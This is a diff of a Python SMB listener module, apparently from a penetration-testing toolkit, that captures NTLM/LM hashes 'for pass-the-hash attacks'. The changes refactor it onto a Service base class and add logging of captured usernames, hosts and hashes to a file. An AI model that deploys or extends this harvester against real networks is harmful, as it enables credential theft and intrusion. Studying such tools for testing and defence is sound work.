@@ -1,19 +1,17 @@
 import socket, struct, sys
 import util
 from threading import Thread
+from service import Service
 
 #
 # SMB listener for harvesting NTLM/LM hashes.
 # This module is used to provide hashes for pass-the-hash attacks and
 # potential in-house hash cracking we build.
 #
-class SMBService:
+class SMBService(Service):
 	def __init__(self):
 		self.captured_hashes = {}	
-		self.running = False
-		self.dump = False
-		self.log_data = False
-		self.log_loc = None
+		super(SMBService, self).__init__('SMB')
 	
 	# parse NTLM/LM hashes
 	# scapy has very limited SMB packet support, so we have to do this manually
@@ -79,6 +77,10 @@ class SMBService:
 			util.Msg('\tLM:   \033[32m%s\033[0m'%(lm_hash.upper()))
 			util.Msg('\tNTLM: \033[32m%s\033[0m'%ntlm_hash.upper())
 			util.Msg('\tChallenge: \033[32m%s\033[0m'%('1122334455667788'))
+
+		if self.log_data:
+			data = 'Username: %s\nHost: %s\nLM: %s\nNTLM: %s\nChallenge: %s\n'%(uname,hname,lm_hash.upper(),ntlm_hash.upper(),'1122334455667788')
+			self.log_file.write(data + '\n')
 
 	# get packet payload 
 	def get_payload(self, data):
@@ -214,17 +216,3 @@ class SMBService:
 			 	break
 		socker.close()
 		util.debug('SMB listener shutdown.')
-	
-	# shutdown		  
-	def shutdown(self):
-		util.Msg('Shutting SMB listener down')
-		self.running = False
-
-	# view dumps
-	def view(self):
-		try:
-			while True:
-				self.dump = True
-		except KeyboardInterrupt:
-			self.dump = False
-			return
